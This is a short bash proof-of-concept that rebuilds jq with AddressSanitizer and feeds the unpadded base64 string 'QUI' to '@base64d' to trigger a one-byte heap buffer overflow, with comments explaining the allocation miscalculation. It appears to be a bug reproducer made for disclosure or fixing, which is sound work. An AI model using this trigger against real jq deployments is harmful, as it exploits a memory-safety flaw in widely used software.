#!/bin/bash
# PoC: heap-buffer-overflow in @base64d decoder
# The base64 decode allocation formula under-allocates by 1 byte
# for unpadded base64 inputs where len % 4 == 3, causing a
# heap buffer overflow when the trailing 3-char group decodes
# to 2 output bytes but only 1 byte of space was allocated.
set -e
cd "$(dirname "$0")"

# Rebuild with AddressSanitizer to detect the 1-byte heap overflow
make clean > /dev/null 2>&1
CFLAGS="-g -fsanitize=address -fno-omit-frame-pointer" \
LDFLAGS="-fsanitize=address" \
  ./configure --with-oniguruma=builtin \
              --disable-maintainer-mode \
              --disable-shared \
              --enable-static > /dev/null 2>&1
make -j"$(nproc)" > /dev/null 2>&1

if file jq | grep -q ELF; then cp jq executable; else cp .libs/jq executable; fi

# "QUI" is base64 for "AB" (no padding, len=3, len%4=3)
# The buggy allocation computes (3/4)*3 + (3%4)/2 = 0+1 = 1 byte
# but decoding the trailing 3-char group writes 2 bytes → overflow
echo '"QUI"' | ./executable '@base64d'
